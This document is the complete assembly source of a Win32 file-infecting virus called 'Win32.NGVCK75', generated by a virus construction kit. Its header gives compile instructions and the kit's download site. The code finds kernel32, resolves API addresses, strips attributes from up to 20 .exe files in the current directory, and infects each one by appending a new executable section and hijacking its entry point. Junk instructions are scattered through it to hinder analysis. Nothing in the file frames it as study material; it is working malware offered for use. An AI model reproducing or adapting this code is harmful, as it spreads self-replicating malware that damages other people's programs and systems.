              
;
;
; Win32.NGVCK75 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK75
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 47829 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebp
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 mov ebx, ( 20d + 18d )
 sub ebx, 18d
 mov dword ptr [ebp+InfCounter], ebx
 lea eax, [ebp+filemask]
 xchg eax, edi

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 test edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 Misc1       dd 0h
 NewEIP      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 filemask    db '*.Exe',0
 AlignReg2   dd 0h
 NTableVA    dd 0h
 TempAPI     dd 0h
 TempApisearch3 dd 0h
 AlignReg1   dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NtvxTNC'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FileHandle  dd 0h
 K32Trys     dd 0h
 OldBase     dd 400000h

 counter     dw 0h
 MapHandle   dd 0h
 KernelMZ    dd 0h
 MapAddress  dd 0h
 NewSize     dd 0h
 Trash1      dd 0h
 PEheader    dd 0h
 sectionalign   dd 0h
 TempApisearch2 dd 0h
 FindHandle  dd 0h

 APINames:
 db 'CreateFileMappingA', 0
 db 'CloseHandle', 0
 db 'FindClose', 0
 db 'CreateFileA', 0
 db 'UnmapViewOfFile', 0
 db 'SetFileAttributesA', 0
 db 'FindNextFileA', 0
 db 'GetFileAttributesA', 0
 db 'FindFirstFileA', 0
 db 'MapViewOfFile', 0

 KernelPE    dd 0h
 db 'Win32.NGVCK75 of SnakeByte',0
 InfCounter  dd 0h
 Attributes  dd 0h
 ATableVA    dd 0h
 filealign   dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h

 OTableVA    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 mov edx, -53224d
 add edx, 53224d

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 add edx, 1d
 push edx
 mov eax, 80000000h or 40000000h
 push eax
 mov edi, offset WFD_szFileName
 add edi, ebp

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 and ecx, 0
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 mov edx, 75239154d                     ; Trash
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ebx
 test eax, eax
 jz CloseFile
 push ebx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, ( 2d - 29d )
 add ecx, 29d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 mov ecx, eax                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 sub edx, edx
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 xor eax, eax
 and dword ptr [ebp+Trash1], 161602     ; Trash
 add eax, [ecx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add eax, 4
 add eax, 4d
                                        ; get OTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; clear eax
 mov eax, 26571d
 sub eax, 26571d
 add eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; mov eax, ecx
                                        ; clear eax
 mov eax, 0
 add eax, ecx
                                        ; mov esi, eax
 mov esi, eax
 push ebx
 mov dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov cl, byte ptr [edx]
 cmp cl, byte ptr [esi]
 jne ApiNotFound
 add ebx, -1
 cmp ebx, 0
 je FoundApi1
                                        ; add esi, 1
 sub esi, -1d
                                        ; add edx, 1
 sub edx, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop eax
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+TempApisearch2]
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov edi, eax
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [edi]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
 sar ecx, 24d                           ; Trash
                                        ; convert to RVA
                                        ; mov ecx, -1
 mov ecx, ( -1d + 15d )
 sub ecx, 15d
 and ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg ebx, edx

 lea eax, [ebp+APIOffsets]
 xchg eax, edi


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 push edx
 pop ebx
APINameDetect:                          ; calculate the lenght of the names
 inc ebx
 cmp byte ptr [ebx], 0
 jne APINameDetect

 sub ebx, edx
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add edx, ebx
                                        ; add edx, 1
 add edx, 1d
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], eax
                                        ; add edi, 4
 add edi, 4d
 loop GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
 mov eax, [esi+3Ch]
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], eax
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov eax, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [edi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], edx
 mov edx, [edi+38h]
 mov dword ptr [ebp+sectionalign], 0
 xor dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ebx, [edi+74h]
 shl ebx, 3
                                        ; clear edx
 mov edx, -10095d
 add edx, 10095d
 mov dx, word ptr [edi+6h]
 mov ecx, 28h
 pushad
 mov eax, edx
 mul ecx
 push eax
 pop dword ptr [ebp+Misc1]
 popad
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [ebp+Misc1]
 add edi, 78h
 add edi, ebx
 add edi, edx
 mov ecx, ebp
 add ecx, offset newsection


 xchg ecx, edi
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+nsphysicalsize], -1
 and dword ptr [ebp+nsphysicalsize], edx
 Call Align
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 Call Align
                                        ; mov edx, -1
 mov edx, ( -1d xor 31d )
 xor edx, 31d
 and edx, dword ptr [ebp+AlignReg1]
 push edx
 pop dword ptr [ebp+nsvirtualsize]
                                        ; calculate physical offset
 mov ebx,[ecx-5*8+20d]
 add ebx,[ecx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
                                        ; clear edx
 mov edx, 25902d
 sub edx, 25902d
 add edx, dword ptr [ebp+filealign]
 mov ecx, ebx
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 64
 mov ebx, 64d
 pop edx
 lea ecx, [ebp+newsection]

WriteNewSectionLoop:
 mov ah, byte ptr [ecx]
 mov byte ptr [edx], ah
 dec ebx
                                        ; add edx, 1
 inc edx
                                        ; add ecx, 1
 sub ecx, -1d
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov eax, dword ptr [ebp+PEheader]
 add word ptr [eax+06h], 1
 mov ecx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], ecx
                                        ; set new EIP
 mov dword ptr  [eax+28h], ecx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], -1d
 and dword ptr [eax+4Ch], 'NGVC'
 push dword ptr [ebp+nsphysicaloffset]
 pop edx
 or ebx, 68239461d                      ; Trash
 push edx
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg esi, eax

 mov ecx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 add ecx, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov esi, dword ptr [esp]
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], eax

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax


                                        ; round to pages
 ror esi, 16d
 shl esi, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 53005
 sub dword ptr [ebp+K32Trys], 3005d

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 or eax, eax
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je CheckPE
 ror eax, 30d                           ; Trash

GK2:
                                        ; mov eax, 65536
 push 65536d
 pop eax
 sub esi, eax
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov edi, [esi]
 add esi, -60d
 add edi, esi
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edi, 22
 add edi, 22d
                                        ; clear edx
 xor edx, edx
 movzx edx, word ptr [edi]
 not ebx                                ; Trash
 and dx, 0F000h
 cmp dx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 add edi, -22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], esi
 mov dword ptr [ebp+KernelPE], edi

 lea ecx, GetApis
 add ecx, ebp

 push ecx
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push ecx
                                        ; clear edx
 mov edx, -16694d
 add edx, 16694d
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret
 and dword ptr [ebp+Trash1], 1229966    ; Trash


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]

                                        ; mov eax, 276
 mov eax, ( 276d xor 0d )
 xor eax, 0d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 inc edi
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, ecx

 push ecx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop edx

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edx

                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 push edx
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xor dword ptr [ebp+Trash1], 1049220    ; Trash

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, ( 128d - 14d )
 add ecx, 14d
 push ecx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ecx


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 sub eax, 1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 lea edi, [ebp+WFD_nFileSizeLow]
 xchg edi, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp eax, 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; clear eax
 xor eax, eax
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz Notagoodfile

Goodfile:
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [edx+3Ch]
 test ebx, ebx
 jz Notagoodfile
 mov edi, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edi]
 xor eax, 'EP'
 jz Goodfile2
                                        ; clear eax
 xor eax, eax
 dec eax
 inc eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jnz yNotagoodfile
 ror ebx, 20d                           ; Trash
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [edi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 mov eax, ebp
 add eax, offset WFD_szFileName

 push eax
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 xor eax, eax
 push eax
 call ExitProcess



end FakeCode

